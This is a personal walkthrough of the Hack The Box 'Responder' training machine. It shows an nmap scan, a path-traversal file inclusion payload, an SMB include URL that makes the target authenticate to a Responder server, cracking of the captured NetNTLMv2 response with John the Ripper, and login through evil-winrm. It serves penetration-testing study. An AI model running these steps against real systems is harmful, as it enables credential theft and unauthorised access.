# Responder

#### Difficulty: <code>Very Easy</code>

#### Machine Tags
  WinRM  
  Custom Applications  
  Protocols  
  XAMPP  
  SMB  
  Responder  
  PHP  
  Reconnaissance  
  Password Cracking  
  Hash Capture  
  Remote File Inclusion  
  Remote Code Execution  

#### Description
  Learn about File Inclusion vulnerability for webpages served on Windows machines with NetNTLMv2. Responder and John the Ripper will be used. 

#### **Enumeration**
  The normal methods of enumeration are not working, so it seems that we are going to have to scan all ports. What is helpful for situations like this is to set a minimum number of packets that nmap can send per second. 
  ```
    nmap -p- --min-rate {rate_limit} -sV {IP}
  ```
  The services open are:  
  ```
    80/tcp:   http
    5985/tcp: wsman
    7680/tcp: pando-pub
  ```
#### **Windows Remote Management**
  WinRM or Windows Remote Management is a built-in remote management protocol using Simple Object Access Protocol to interact with remote computers and servers. If this service is running, if we can find the credentials with remote management privileges, a user would be able to get Powershell on the host. 

#### **Website Enumeration**
  In some cases, even typing in the IP of the service will not return the web application. The interesting part is after putting the target IP into a browser, we are still unable to connect to any resource. However, the URL changes to http://unika.htb/. 

#### **Name-Based Virtual Hosting**
  A method for hosting multiple dommain names on a single server. This method allows a server to share computing resources without all services to be used by the same hostname. The web server relies on its /etc/hosts file to resolve hostnames into an IP address. Hence, for us to resolve the address, an entry needs to be appended to this file. An example for the command to do this is:
  ```
    echo "{IP}    {hostname}" | sudo tee -a /etc/hosts/
  ```
  Now, the address will resolve to unika.htb allowing the browser to include HTTP header <code>Host: unika.htb</code> in every request sent to the IP address. 

#### **Finding more Information**
  Using Wappalyzer we would be able to find more about about this webpage. 
  ```
  Font Scripts:          Font Awesome, Google Font, API                 Web server Extensions: OpenSSL
  Web Servers:           Apache                                         JavaScript Libraries:  jQuery, OWL Carousel, Isotope
  Programming Languages: PHP                                            UI Frameworks:         Bootstrap, Animate.css
  OS:                    Windows Server
  ```
  Additionally, trying to look at the other tabs of the website we see that there is the option for viewing the website in French. When we do this, we see that the link updates to unika.htb/index.php?=french.html. This is a hint that the website could be vulnerable to Local File Inclusion (LFI). 

#### **File Inclusion Vulnerability**
  Local File Inclusion (LFI) happens when an attacker is able to get a website to include a file that is not intended to be an option for this application. For example, if an app uses path to a file as input without checking then the exploit would be to use '../' until sensitive files are leaked. Somtimes, LFI can lead to code execution. 

  Remote File Inclusion (RFI) similar to LFI but loads a remote file on host using a protocol like HTTP or FTP. The <code>page</code> parameter can be used to see if we can include files on the target. The <code>../</code> string is used to traverse back a directory.

  An example URL file inclusion would look like:
  ```
    Base URL:  http://unika.htb/index.php?
    Parameter: page=../../../../../../../../windows/system32/drivers/etc/hosts

    URL: http://{url}/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
  ```
  Without the proper sanitization, some method processes the URL <code>page</code> parameter can be used to pass malicious input to view internal system files. 

#### **Responder Challenge Capture**
  New Technology Lan Manager (NTLM) is a collection of authenticaion protocols created by Microsoft. Which is a challenge-response authentication protocol to authenticate a client to a response on an AD domain. 
  
  It is a type of single sign-on (SSO) to allow user to provide underlying authentication factor only once when logging on. The NTLM authentication process is done: 

  &emsp;1. Client sends username and domain name to server  
  &emsp;2. Server generates random character string, the challenge  
  &emsp;3. Client encrypts the challenge with NTLM hash of user password and sends back to the server  
  &emsp;4. Server retrieves the user password (or equivalent)  
  &emsp;5. Server uses hash value retrieved from security account database to encrypt the challenge string, then value is compared to value received from the client. If they match then client is authenticated.

#### **NTLM vs NTHash vs NetNTMLv2**
  ***Hash Function***: a one-way function that takes any amount of data and returns fixed size value. Referred to as *hash, digest, or fingerprint*. Used for storing passwords more securely since there's no way to convert hash back to original data. Server can store hash of password and compare to input. 

  ***NTHash***: output of the algorithm used to store passwords on Windows systems in the SAM database and on domain controllers. An NTHash or NTLM hash 

  NTLM protocol does authentication over network using a challenge-response model. NetNTLMv2 challenge-response is a string formatted to include the challenge and response, often referred to as NetNTLMv2 hash but it is **not**. 

#### **Using Responder**
  The PHP configuration file <code>php.ini</code>, the <code>allow_url_include</code> wrapper is set to Off. This means PHP does not load remote HTTP or FTP URLs to prevent RFI attacks. 

  *Even if <code>allow_url_include</code> and <code>allow_url_fopen</code> are off, PHP doesn't prevent loading SMB URLs*

  Using Responder, we will setup malicious SMB server for the target to perform NTLM authentication to it. Responder will send a challenge back for the server to encrypt with the user's password. When the server responds, Responder will use the challenge and encrypted response to generate the NetNTLMv2. The NetNTLMv2 is irreversible, but we can then use John The Ripper to generate hashes to compare it against. 

  If there is a <code>port 80</code> error, turn off the HTTP flag in the Responder.conf (thats what happened to me). 

  When the config file for Responder is done, we can execute the script in Python. Passing in the interface to list on the <code>-I</code> flag. 
  ```
    Python3
    sudo python3 Responder.py -I tun0

    With Kali or HTB PwnBox
    sudo responder -I {network interface}
  ```

  To include a resource from our SMB server using the <code>page</code> parameter:
  ```
    http://{url}/?page=//{smb_ip}/somefile
  ```
  Make sure to include the http:// since some browsers might just Google it. It would give us a permission denied page. However Responder would have:

  ![Responder Output Hash](/HackTheBox/Basics%20of%20Penetration%20Testing/You%20Need%20to%20Walk%20Before%20You%20Can%20Run/Responder/assets/responder_output.png)

#### **Hash Cracking**
  To commence hash crackingh, we take the NTMLv2-SSP Hash, we can plug into the password hash-cracking utility. Using <code>john</code> the flag <code>-w</code> can specify a wordlist to use for cracking. So an example cmd for John the Ripper would look like:
  ```
    john -w={filepath_wordlist} {file_w_hash}
  ```
  ![Hash Cracking Response](/HackTheBox/Basics%20of%20Penetration%20Testing/You%20Need%20to%20Walk%20Before%20You%20Can%20Run/Responder/assets/hash_crack.png)

#### **WinRM**
  For instances that need PowerShell, we will use a tool called Evil-WinRM. To login over it, a command like the following is used:
  ```
    evil-winrm -i {IP} -u {username} -p {password}
  ```